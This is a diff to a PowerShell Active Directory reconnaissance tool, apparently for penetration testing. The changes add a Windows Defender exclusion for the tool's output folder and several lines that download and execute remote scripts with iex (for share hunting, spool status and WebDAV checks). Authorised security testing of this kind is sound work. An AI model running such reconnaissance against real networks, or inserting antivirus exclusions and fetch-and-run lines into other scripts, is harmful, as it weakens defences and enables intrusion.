@@ -340,7 +340,8 @@ function Invoke-JRecon{
 	}
 	
 	if($ToolOutput){$ToolOutput = $ToolOutput.TrimEnd('\')}
-	else{$ToolOutput = "c:\Users\Public\Documents"}
+	else{$ToolOutput = "c:\Users\Public\Documents\JRecon"}
+	Add-MpPreference -ExclusionPath $ToolOutput
 	
 	cd $ToolOutput
 	
@@ -808,85 +809,21 @@ function Invoke-JRecon{
 	if($NoRWShares -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {Write-Host "Skipping R\W Shares Enumeration..." -ForegroundColor Yellow;}
 
 	else{
-
+		
 		echo ""
-		Write-Host "Checking for accessible shares... " -ForegroundColor Cyan;
-		if($NoPingCastle){
-			if(Test-Path -Path $ToolOutput\PingCastle\PingCastle.exe){}
-			else{
-				Invoke-WebRequest -Uri $jpingdownload -OutFile "$ToolOutput\PingCastle.zip"
-
-				Add-Type -AssemblyName System.IO.Compression.FileSystem
-				function Unzip
-				{
-						param([string]$zipfile, [string]$outpath)
-
-						[System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
-				}
-
-				Unzip "$ToolOutput\PingCastle.zip" "$ToolOutput\PingCastle\"
-			}
-		}
+		Write-Host "Checking for shares... " -ForegroundColor Cyan;
 
 		if($Domain){
 			cd $ToolOutput\$Domain
-			.$ToolOutput\PingCastle\PingCastle.exe --scanner share --scmode-all --server $currentDomain
-			$jpingshares = get-content $ToolOutput\$Domain\ad_scanner_share* | Select-String -pattern "True" | foreach {"\\" + $_ }
-			$jpingshares = $jpingshares -replace "True",""
-			$jpingshares = $jpingshares -replace "False",""
-			$jpingshares = $jpingshares.Trim()
-			$jpingshares = $jpingshares -replace "\s","\"
-			$jpingshares > $ToolOutput\$Domain\Shares_Accessible.txt
-			type $ToolOutput\$Domain\Shares_Accessible.txt
-			del $ToolOutput\$Domain\ad_scanner_share*
+			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-ShareHunter/main/Invoke-ShareHunter.ps1')
+			Invoke-ShareHunter -Domain $Domain
 		}
 		
 		else{
 			foreach($AllDomain in $AllDomains){
 				cd $ToolOutput\$AllDomain
-				.$ToolOutput\PingCastle\PingCastle.exe --scanner share --scmode-all --server $AllDomain
-				$jpingshares = get-content $ToolOutput\$AllDomain\ad_scanner_share* | Select-String -pattern "True" | foreach {"\\" + $_ }
-				$jpingshares = $jpingshares -replace "True",""
-				$jpingshares = $jpingshares -replace "False",""
-				$jpingshares = $jpingshares.Trim()
-				$jpingshares = $jpingshares -replace "\s","\"
-				$jpingshares > $ToolOutput\$AllDomain\Shares_Accessible.txt
-				type $ToolOutput\$AllDomain\Shares_Accessible.txt
-				del $ToolOutput\$AllDomain\ad_scanner_share*
-			}
-		}
-
-		echo ""
-		Write-Host "Checking for writable shares..." -ForegroundColor Cyan;
-		
-		function Test-Write {
-					[CmdletBinding()]
-					param (
-							[parameter()] [ValidateScript({[IO.Directory]::Exists($_.FullName)})]
-							[IO.DirectoryInfo] $Path
-					)
-					try {
-							$testPath = Join-Path $Path ([IO.Path]::GetRandomFileName())
-							[IO.File]::Create($testPath, 1, 'DeleteOnClose') > $null
-							return "$Path"
-					} finally {
-							Remove-Item $testPath -ErrorAction SilentlyContinue
-					}
-		}
-		
-		if($Domain){
-			Get-Content $ToolOutput\$Domain\Shares_Accessible.txt | ForEach-Object {Test-Write $_ -ea silentlycontinue >> $ToolOutput\$Domain\Shares_Writable_Temp.txt}
-			type $ToolOutput\$Domain\Shares_Writable_Temp.txt | Get-Unique > $ToolOutput\$Domain\Shares_Writable.txt
-			del $ToolOutput\$Domain\Shares_Writable_Temp.txt
-			type $ToolOutput\$Domain\Shares_Writable.txt
-		}
-		
-		else{
-			foreach($AllDomain in $AllDomains){
-				Get-Content $ToolOutput\$AllDomain\Shares_Accessible.txt | ForEach-Object {Test-Write $_ -ea silentlycontinue >> $ToolOutput\$AllDomain\Shares_Writable_Temp.txt}
-				type $ToolOutput\$AllDomain\Shares_Writable_Temp.txt | Get-Unique > $ToolOutput\$AllDomain\Shares_Writable.txt
-				del $ToolOutput\$AllDomain\Shares_Writable_Temp.txt
-				type $ToolOutput\$AllDomain\Shares_Writable.txt
+				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-ShareHunter/main/Invoke-ShareHunter.ps1')
+				Invoke-ShareHunter -Domain $AllDomain
 			}
 		}
 		
@@ -1008,32 +945,6 @@ function Invoke-JRecon{
 	
 	elseif(!$URLFileClean -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {Write-Host "Skipping URL File attack cleaning..." -ForegroundColor Yellow}
 	
-	if($NoSpool -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){Write-Host "Skipping Spool Service Checking..." -ForegroundColor Yellow}
-	else{
-		
-		iex(new-object net.webclient).downloadstring("$ServerURL/Get-SpoolStatus.ps1")
-		
-		echo ""
-		Write-Host "Checking for Spool Status Enabled on Servers..." -ForegroundColor Cyan;
-		
-		if($Domain){
-			$AllMachines = $null
-			$AllMachines = (Get-DomainComputer -Domain $Domain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE | select dnshostname); ForEach($Machine in $AllMachines){Get-SpoolStatus $Machine.dnshostname | Where {$_ -like "*True*"} | ForEach-Object {$_ -replace " True", ""}}
-			$AllMachines | Select-Object -ExpandProperty dnshostname | Out-File "$ToolOutput\$Domain\Spool_Status_Enabled.txt"
-		}
-		
-		else{
-			foreach($AllDomain in $AllDomains){
-				$AllMachines = $null
-				$AllMachines = (Get-DomainComputer -Domain $AllDomain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE | select dnshostname); ForEach($Machine in $AllMachines){Get-SpoolStatus $Machine.dnshostname | Where {$_ -like "*True*"} | ForEach-Object {$_ -replace " True", ""}}
-				$AllMachines | Select-Object -ExpandProperty dnshostname | Out-File "$ToolOutput\$AllDomain\Spool_Status_Enabled.txt"
-			}
-		}
-		
-		Write-Host "Done!" -ForegroundColor Green;
-		echo " "
-	}
-	
 	if($NoWebDAV -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){Write-Host "Skipping WebDAV Checking..." -ForegroundColor Yellow}
 	else{
 		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/CheckWebDAVStatus/main/CheckWebDAVStatus.ps1')
@@ -1042,12 +953,12 @@ function Invoke-JRecon{
 		Write-Host "Checking for WebDAV Status Enabled..." -ForegroundColor Cyan;
 		
 		if($Domain){
-			CheckWebDAVStatus -Domain $Domain -OutputFile "$ToolOutput\$Domain\WebDAVStatusEnabled.txt"
+			CheckWebDAVStatus -Domain $Domain -OutputFile "$ToolOutput\$Domain\WebDAVStatusEnabled.txt" -Sessions
 		}
 		
 		else{
 			foreach($AllDomain in $AllDomains){
-				CheckWebDAVStatus -Domain $AllDomain -OutputFile "$ToolOutput\$AllDomain\WebDAVStatusEnabled.txt"
+				CheckWebDAVStatus -Domain $AllDomain -OutputFile "$ToolOutput\$AllDomain\WebDAVStatusEnabled.txt" -Sessions
 			}
 		}
 		
@@ -1244,6 +1155,32 @@ function Invoke-JRecon{
 				Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $encodedCommand"
 			}
 		}
+	}
+	
+	if($NoSpool -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){Write-Host "Skipping Spool Service Checking..." -ForegroundColor Yellow}
+	else{
+		
+		iex(new-object net.webclient).downloadstring("$ServerURL/Get-SpoolStatus.ps1")
+		
+		echo ""
+		Write-Host "Checking for Spool Status Enabled on Servers..." -ForegroundColor Cyan;
+		
+		if($Domain){
+			$AllMachines = $null
+			$AllMachines = (Get-DomainComputer -Domain $Domain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE | select dnshostname); ForEach($Machine in $AllMachines){Get-SpoolStatus $Machine.dnshostname | Where {$_ -like "*True*"} | ForEach-Object {$_ -replace " True", ""}}
+			$AllMachines | Select-Object -ExpandProperty dnshostname | Out-File "$ToolOutput\$Domain\Spool_Status_Enabled.txt"
+		}
+		
+		else{
+			foreach($AllDomain in $AllDomains){
+				$AllMachines = $null
+				$AllMachines = (Get-DomainComputer -Domain $AllDomain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE | select dnshostname); ForEach($Machine in $AllMachines){Get-SpoolStatus $Machine.dnshostname | Where {$_ -like "*True*"} | ForEach-Object {$_ -replace " True", ""}}
+				$AllMachines | Select-Object -ExpandProperty dnshostname | Out-File "$ToolOutput\$AllDomain\Spool_Status_Enabled.txt"
+			}
+		}
+		
+		Write-Host "Done!" -ForegroundColor Green;
+		echo " "
 	}
 	
 	cd $tempdirectory
